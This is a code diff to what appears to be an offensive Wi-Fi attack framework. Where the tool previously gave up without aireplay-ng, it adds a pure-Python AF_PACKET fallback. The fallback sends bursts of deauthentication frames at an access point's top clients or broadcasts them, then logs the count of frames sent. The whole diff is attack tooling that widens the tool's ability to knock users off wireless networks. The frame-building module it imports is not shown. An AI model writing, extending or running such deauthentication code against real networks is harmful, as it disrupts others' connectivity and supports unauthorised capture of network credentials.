@@ -151,14 +151,38 @@ class AttackContext:
             return count
 
         aireplay = registry.path("aireplay-ng")
-        if not aireplay:
-            self.log("aireplay-ng not available: cannot deauthenticate", level="warning")
-            return 0
         self.set_channel(ap.channel)
         targets = [client] if client else (
             [c.mac for c in sorted(ap.clients.values(), key=lambda c: c.signal, reverse=True)[:2]]
             if not broadcast and ap.clients else []
         )
+        # Native fallback: if aireplay-ng is not installed use our pure-Python
+        # AF_PACKET deauther. Same behaviour (per-target bursts, bidirectional
+        # deauths, channel set above) but zero external dependency.
+        if not aireplay:
+            try:
+                from ..native.deauth import Deauther
+                burst_count = max(1, int(self.config.deauth_burst))
+                total = count * burst_count * max(1, len(targets) or 1)
+                d = Deauther(self.monitor, ap.bssid, ap.channel or 1,
+                             clients=targets if targets else None,
+                             broadcast=broadcast or not targets,
+                             count=total,
+                             burst_size=count, interval=self.config.deauth_interval,
+                             disassoc=False, spoof_mac=False)
+                stats = d.run(duration=max(2.0, total * 0.005))
+                ap.deauths_sent += stats.sent
+                self.session.stats.deauths += stats.sent
+                self.bus.publish(EK.DEAUTH, {
+                    "bssid": ap.bssid, "sent": stats.sent,
+                    "client": ", ".join(targets) or "broadcast",
+                    "source": "native",
+                })
+                return stats.sent
+            except Exception as exc:
+                self.log(f"native deauth unavailable ({exc}); cannot deauthenticate",
+                         level="warning")
+                return 0
         sent = 0
         bursts = max(1, int(self.config.deauth_burst))
         for index in range(bursts):
